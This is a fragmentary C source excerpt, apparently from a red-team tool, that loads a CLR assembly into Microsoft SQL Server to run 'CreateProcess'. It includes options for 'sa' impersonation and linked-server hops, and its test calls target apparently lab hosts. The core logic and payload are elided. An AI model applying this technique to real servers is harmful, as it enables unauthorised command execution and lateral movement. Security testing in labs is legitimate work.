...
void ExecuteClrAssembly(char* server, char* user, char* password, char* database, char* link, char* impersonate, char* function, char* hash, char* hexBytes)
{
    SQLHENV env			 = NULL;
    SQLHSTMT stmt 		 = NULL;
	SQLHDBC dbc 		 = NULL;
...
) 
{
	...
	ExecuteClrAssembly(server, user, password, database, link, impersonate, function, hash, hexBytes);
	intFree(hexBytes);
	printoutput(TRUE);
};
...
int main()
{
	...
	ExecuteClrAssembly("castelblack.north.sevenkingdoms.local", NULL, NULL, "master", NULL, NULL, "CreateProcess", "18dcee3265e0143d695ef0534ef9ab29f68d772d8b04fb7cfee39275aa1b3501d974591643bcf17f0ca3836d386aea57f09657783f23a70bcce7db2ddfb80f99", bytes);

	internal_printf("\n\n============ IMPERSONATE TEST ============\n\n");
	ExecuteClrAssembly("castelblack.north.sevenkingdoms.local", NULL, NULL, "master", NULL, "sa", "CreateProcess", "18dcee3265e0143d695ef0534ef9ab29f68d772d8b04fb7cfee39275aa1b3501d974591643bcf17f0ca3836d386aea57f09657783f23a70bcce7db2ddfb80f99", bytes);

	internal_printf("\n\n============ LINK TEST ============\n\n");
	ExecuteClrAssembly("castelblack.north.sevenkingdoms.local", NULL, NULL, "master", "BRAAVOS", NULL, "CreateProcess", "18dcee3265e0143d695ef0534ef9ab29f68d772d8b04fb7cfee39275aa1b3501d974591643bcf17f0ca3836d386aea57f09657783f23a70bcce7db2ddfb80f99", bytes);
}
